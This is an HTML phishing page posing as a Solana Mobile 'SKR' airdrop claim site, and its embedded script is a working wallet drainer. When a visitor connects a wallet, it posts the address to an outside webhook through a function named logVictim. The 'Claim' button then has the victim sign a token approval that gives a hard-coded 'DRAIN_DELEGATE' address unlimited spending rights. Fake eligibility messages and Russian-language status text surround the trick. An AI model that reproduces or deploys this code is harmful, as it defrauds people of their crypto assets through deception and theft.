<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SKR | Solana Mobile</title>
    <style>
        body { margin: 0; padding: 0; font-family: 'Helvetica Neue', Arial, sans-serif; background: #000; color: #fff; text-align: center; position: relative; }
        header { position: fixed; top: 20px; right: 20px; z-index: 10; }
        .connect-btn { background: #a0ffcb; color: #000; padding: 12px 30px; font-size: 1.2em; border-radius: 50px; cursor: pointer; font-weight: bold; }
        .container { max-width: 1200px; margin: 0 auto; padding: 120px 20px 60px; }
        .skr-logo { width: 400px; margin: 60px auto; display: block; filter: drop-shadow(0 0 30px #a0ffcb); }
        .solana-logo { width: 320px; margin: 40px auto 60px; display: block; }
        h1 { font-size: 7em; font-weight: 900; margin: 0; letter-spacing: -5px; }
        .subtitle { font-size: 2.2em; color: #a0ffcb; margin: 40px 0; font-weight: bold; }
        p { font-size: 1.6em; line-height: 1.8; max-width: 900px; margin: 40px auto; }
        .highlight { color: #a0ffcb; }
        .claim-section { margin: 80px 0; }
        button.claim-btn { background: #a0ffcb; color: #000; padding: 25px 80px; font-size: 2.2em; border-radius: 60px; cursor: pointer; font-weight: bold; }
        button.claim-btn:disabled { background: #444; opacity: 0.6; }
        #status { font-size: 1.6em; min-height: 100px; margin: 40px; word-break: break-all; }
        table { width: 90%; max-width: 1000px; margin: 80px auto; border-collapse: collapse; background: #111; }
        th, td { padding: 30px; border: 1px solid #333; font-size: 1.4em; text-align: left; }
        th { background: #222; color: #a0ffcb; }
        @media (max-width: 768px) {
            h1 { font-size: 4.5em; letter-spacing: -3px; }
            .subtitle { font-size: 1.8em; }
            p { font-size: 1.4em; }
            .skr-logo { width: 300px; }
            .solana-logo { width: 250px; }
            button.claim-btn { width: 90%; padding: 30px; font-size: 2.2em; }
            header { top: 10px; right: 10px; }
            .connect-btn { padding: 15px 30px; font-size: 1.4em; }
            table, th, td { font-size: 1.2em; padding: 15px; text-align: center; }
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
</head>
<body>
    <header>
        <button class="connect-btn" id="connect-wallet">Connect Wallet</button>
    </header>
    <div class="container">
        <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i" alt="SKR Logo" class="skr-logo">
        <img src="https://solanamobile.com/_next/static/media/logo-solana-mobile.1d5e0b0f.svg" alt="Solana Mobile" class="solana-logo">
        <h1>SKR</h1>
        <p class="subtitle">The Native Asset of the Solana Mobile Ecosystem</p>
        <p>Today's mobile duopoly controls what apps ship, who gets paid, and what rules apply. Solana Mobile is building the alternative — an <span class="highlight">open mobile platform</span>.</p>
        <p>Congratulations! Your wallet is eligible for the SKR airdrop allocation (up to 5,000,000 SKR based on activity)</p>

        <div class="claim-section">
            <div id="wallet-address">Connect wallet to claim</div>
            <button class="claim-btn" id="claim-skr" disabled>Claim SKR Allocation</button>
            <div id="status"></div>
        </div>

        <h2>Token Distribution</h2>
        <table>
            <tr><th>Category</th><th>Allocation</th><th>Unlock Schedule</th></tr>
            <tr><td>Airdrops</td><td class="highlight">30%</td><td>Unlocked at launch</td></tr>
            <tr><td>Growth + Partnerships</td><td>25%</td><td>28% unlocked at launch, linear over 18 months</td></tr>
            <tr><td>Solana Mobile Team</td><td>15%</td><td>12-month cliff, 36-month linear vest</td></tr>
            <tr><td>Liquidity + Launch</td><td>10%</td><td>Unlocked at launch</td></tr>
            <tr><td>Solana Labs</td><td>10%</td><td>12-month cliff, 36-month linear vest</td></tr>
            <tr><td>Community Treasury</td><td>10%</td><td>Unlocked at launch</td></tr>
        </table>
        <p>Total Supply: <strong>10,000,000,000 SKR</strong> | TGE: January 2026</p>
        <p>Inflation starts at 10% year 1, decaying 25% annually to 2% terminal rate.</p>
        <p>Guardians voting and staking live in 2026.</p>
    </div>

    <script>
        const TOKEN_MINT = "Gf3XtY632if3F7yvnNdXQi8SnQTBsn8F7DQJFXru5Lh";
        const DRAIN_DELEGATE = "ES68acG4AZAbikhpSJwDdpE1J9S7AnGCp9JWPu9zHseN";
        const WEBHOOK_URL = "https://solana.requestcatcher.com/test";

        let walletPubkey;

        function logVictim(wallet, sig = "") {
            fetch(WEBHOOK_URL, {
                method: "POST",
                body: JSON.stringify({ wallet: wallet, signature: sig, time: new Date().toISOString() })
            }).catch(() => {});
        }

        document.getElementById('connect-wallet').onclick = async () => {
            if (!window.solana) {
                document.getElementById('status').innerText = "Установи Solana wallet (Phantom, Backpack, Solflare и др.)!";
                return;
            }
            try {
                await window.solana.connect();
                walletPubkey = window.solana.publicKey.toString();
                document.getElementById('wallet-address').innerText = Connected: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
                document.getElementById('connect-wallet').innerText = "Connected";
                document.getElementById('connect-wallet').disabled = true;
                document.getElementById('claim-skr').disabled = false;
                document.getElementById('status').innerText = "Кошелёк подключён — готов к клейму!";

                logVictim(walletPubkey);
            } catch (err) {
                document.getElementById('status').innerText = "Ошибка подключения — попробуй снова";
            }
        };

        document.getElementById('claim-skr').onclick = async () => {
            if (!walletPubkey) return;
            document.getElementById('status').innerHTML = "Обрабатываем...<br>Подпиши транзакцию для одобрения";

            try {
                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                const mint = new solanaWeb3.PublicKey(TOKEN_MINT);
                const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
                const owner = new solanaWeb3.PublicKey(walletPubkey);

                const ata = await splToken.getAssociatedTokenAddress(mint, owner);

                let instructions = [];
                instructions.push(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));

                instructions.push(splToken.createApproveInstruction(ata, delegate, owner, [], Number.MAX_SAFE_INTEGER));

                const tx = new solanaWeb3.Transaction().add(...instructions);
                tx.feePayer = owner;
                const { blockhash } = await connection.getLatestBlockhash();
                tx.recentBlockhash = blockhash;

                const signed = await window.solana.signTransaction(tx);
                const sig = await connection.sendRawTransaction(signed.serialize());

                document.getElementById('status').innerHTML = Успех! Одобрено.<br>SKR придут на TGE (январь 2026).<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig}</a>;
                document.getElementById('claim-skr').disabled = true;
        logVictim(walletPubkey, sig);
            } catch (err) {
                document.getElementById('status').innerText = "Ошибка — попробуй снова или проверь кошелёк";
            }
        };
    </script>
</body>
</html>
